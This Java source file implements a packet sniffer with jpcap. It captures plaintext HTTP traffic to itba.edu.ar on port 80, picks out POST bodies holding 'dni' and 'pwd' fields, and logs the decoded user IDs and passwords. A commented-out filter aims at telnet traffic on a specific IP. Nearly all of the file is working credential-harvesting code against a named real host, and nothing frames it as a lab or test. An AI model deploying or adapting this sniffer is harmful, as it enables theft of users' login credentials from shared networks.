package org.app;

import java.net.URLDecoder;
import java.util.regex.Pattern;

import net.sourceforge.jpcap.capture.CaptureDeviceNotFoundException;
import net.sourceforge.jpcap.capture.PacketCapture;
import net.sourceforge.jpcap.capture.PacketListener;
import net.sourceforge.jpcap.net.Packet;
import net.sourceforge.jpcap.net.TCPPacket;

import org.apache.log4j.Logger;

public class Sniffer {

	private static final Logger LOG = Logger.getLogger(Sniffer.class);
	
	private static final String IOL_POST_DATA_PATTERN = "dni=.*&pwd=.*(&.*)*"; 
	
	private static final int INFINITE = -1;
	private static final int PACKET_COUNT = INFINITE;
	/*
	 * private static final String HOST = "203.239.110.20"; private static final
	 * String FILTER = "host " + HOST + " and proto TCP and port 23";
	 */

	private static final String FILTER = "host itba.edu.ar and ip and tcp and port 80";

	private String inet;
	PacketCapture pcap;
	
	public Sniffer(){
		pcap = new PacketCapture();
	}

	public void setInterface(String inet) throws CaptureDeviceNotFoundException {
		if(inet == null){
			inet = pcap.findDevice();
		}
		this.inet = inet;
	}

	public void sniff() throws Exception {
		// Initialize jpcap
		System.out.println("Using device '" + inet + "'");
		pcap.open(inet, 4000, true, 5000);
		pcap.setFilter(FILTER, true);
		pcap.addPacketListener(new PacketHandler());

		System.out.println("Capturing packets...");
		pcap.capture(PACKET_COUNT);
	}

	class PacketHandler implements PacketListener {
		public void packetArrived(Packet packet) {
			try {
				// only handle TCP packets
				if (packet instanceof TCPPacket) {
					TCPPacket tcpPacket = (TCPPacket) packet;
					byte[] data = tcpPacket.getTCPData();
					String isoData = new String(data, "ISO-8859-1");
					if(isoData.startsWith("POST")){
						String[] sections = isoData.split("\r\n\r\n");
						if(sections.length >= 2){
							if( Pattern.matches(IOL_POST_DATA_PATTERN, sections[1]) ){
								String dni, pwd;
								String[] parameters = sections[1].split("&");
								dni = parameters[0].substring(parameters[0].indexOf("=") + 1, parameters[0].length());
								pwd = parameters[1].substring(parameters[1].indexOf("=") + 1, parameters[1].length());
								dni = URLDecoder.decode(dni, "UTF-8");
								pwd = URLDecoder.decode(pwd, "UTF-8");
								LOG.trace("> dni:'" + dni + "' pwd:'" + pwd + "'");
							}
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}